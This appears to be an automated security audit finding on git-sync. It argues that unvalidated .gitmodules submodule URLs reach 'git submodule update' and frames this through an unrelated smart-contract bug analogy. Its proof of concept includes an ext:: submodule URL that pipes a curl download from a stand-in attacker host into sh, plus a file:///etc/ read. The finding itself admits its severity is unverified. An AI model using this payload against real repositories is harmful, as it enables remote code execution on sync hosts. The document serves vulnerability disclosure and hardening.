### Title
Unchecked `.gitmodules` content drives `git submodule update --init` execution, allowing attacker-controlled submodule URLs to reach `git` unsanitized - (File: main.go)

### Summary
The external report's root cause is a classic "unchecked parameter trusted at the point of use" pattern: `investDAI` accepts a policy-book address and, without validating it belongs to a real pool, hands it straight to a privileged sink (`addLiquidityFromLM`). The closest reachable analog in `git-sync--004` is `configureWorktree`, which reads the `.gitmodules` file that comes verbatim from the synced (attacker-controlled) repository content and passes the submodule URLs it contains straight into `git submodule update --init [--recursive]` with no validation of scheme/host, exactly mirroring the "parameter accepted, never checked, only consumed at the end" pattern.

### Finding Description
`configureWorktree` unconditionally runs submodule initialization whenever `--submodules` is not `off` (the default is `recursive`): [1](#0-0) 

The submodule URLs and update semantics for this command are not supplied by git-sync's own flags — they come from the `.gitmodules` file inside the just-fetched worktree, i.e., content that is entirely controlled by whoever can push a commit to (or otherwise influence the content of) the upstream `--repo`. git-sync never inspects, filters, or validates this file before invoking `git submodule update --init --recursive`. There is no `GIT_ALLOW_PROTOCOL` restriction, no `protocol.*.allow` configuration, and no allow-listing of submodule hosts/schemes anywhere in `main.go` (a search for such protections in the codebase found none, only vendored, unrelated matches in third-party dependencies) [2](#0-1) .

This mirrors the report's bug class precisely: a value that flows from an untrusted source (the `_policyBookAddr` parameter in the original report; the `.gitmodules`-derived submodule URL here) is accepted and used at a sensitive sink (`addLiquidityFromLM` there; `git submodule update` here) without any validation that the value is what the caller/operator actually intended.

### Impact Explanation
If an attacker can push a commit (or otherwise get content merged) into the synced repository, they can add or modify `.gitmodules` to point at attacker-controlled remotes, including remotes using URL schemes/transports that older or misconfigured `git` builds still honor (e.g., `ext::`, or arbitrary `file://` paths that read/write outside `--root`). Depending on the `git` version bundled in the container image and its default protocol allow-list, this can lead to:
- Command execution as the git-sync process (RCE) via unsafe submodule transports.
- Reading/writing files outside `--root` via `file://` submodule fetches.
- SSRF/credential probing against internal hosts reachable from the sidecar, since credentials configured via `--credential`/`--username` are handed to `git credential approve` and may be replayed against any URL matching the credential's host, including one supplied by the attacker via `.gitmodules`.

This directly satisfies the "Accept" criteria: potential code execution, file write/read outside `--root`, or credential disclosure, all triggered purely from attacker-pushed repository content.

### Likelihood Explanation
Likelihood is moderate and version-dependent. Modern `git` (>= 2.17.1) disables the historically dangerous `ext::` and restricts `file://` submodule protocols by default, which significantly mitigates the RCE vector unless the container's git version predates that fix or an operator has broadened `protocol.*.allow` via `--git-config`. However, git-sync does not add any additional restriction of its own on top of whatever the bundled `git` binary defaults to, so the safety of this path is entirely incidental to git's own defaults, not to any control implemented by git-sync. This is a real gap even if not immediately exploitable on every git version, and it is definitely reachable: any repo owner or anyone with push access to a branch/tag/hash that git-sync tracks can trigger it with `--submodules` at its default (`recursive`).

### Recommendation
- Do not blindly run `git submodule update --init [--recursive]` against arbitrary `.gitmodules` content. At minimum, explicitly set `GIT_ALLOW_PROTOCOL` (or equivalent `-c protocol.allow=never -c protocol.https.allow=always -c protocol.ssh.allow=always`) when invoking submodule commands, regardless of the bundled git's defaults, so the restriction is explicit and version-independent.
- Consider validating or restricting submodule URLs against an operator-approved allow-list (host/scheme) before running submodule update, similar to how the report recommends validating the policy book address before trusting it.
- Document/require operators to pin a `git` version known to have the protocol allow-list hardening, and fail closed (i.e., refuse to sync) if the required protections cannot be verified.

### Proof of Concept
1. Attacker with push access to the tracked branch of `--repo` adds a `.gitmodules` entry:
   ```
   [submodule "evil"]
       path = evil
       url = ext::sh -c "curl -s http://attacker/x | sh"
   ```
   (or, on a git version/config without protocol hardening, `url = file:///etc/`) and commits it.
2. git-sync's periodic sync loop calls `SyncRepo` → `configureWorktree`, which unconditionally executes:
   `git submodule update --init --recursive` in the new worktree [1](#0-0) .
3. If the bundled `git` binary/config permits the transport used in `url`, the command executes as the git-sync process (or reads/writes outside `--root`), all without git-sync ever inspecting or validating the submodule URL supplied by the attacker-controlled commit.

Note: I was unable to inspect the exact `git.Run`/`cmd.Runner` implementation's environment/argument construction in full detail (only `pkg/hook/exechook.go`'s use of `os.Environ()` was directly retrievable), so I cannot confirm with certainty whether any additional environment-level protocol restriction is set elsewhere in the runner that the search did not surface. If such a restriction exists in `pkg/cmd/cmd.go` or similar (not returned by my searches), it would reduce the severity of this finding; this should be verified directly in the repository before final triage.

### Citations

**File:** main.go (L1733-1747)
```go
	// Update submodules
	// NOTE: this works for repo with or without submodules.
	if git.submodules != submodulesOff {
		git.log.V(1).Info("updating submodules")
		submodulesArgs := []string{"submodule", "update", "--init"}
		if git.submodules == submodulesRecursive {
			submodulesArgs = append(submodulesArgs, "--recursive")
		}
		if git.depth != 0 {
			submodulesArgs = append(submodulesArgs, "--depth", strconv.Itoa(git.depth))
		}
		if _, _, err := git.Run(ctx, worktree.Path(), submodulesArgs...); err != nil {
			return err
		}
	}
```
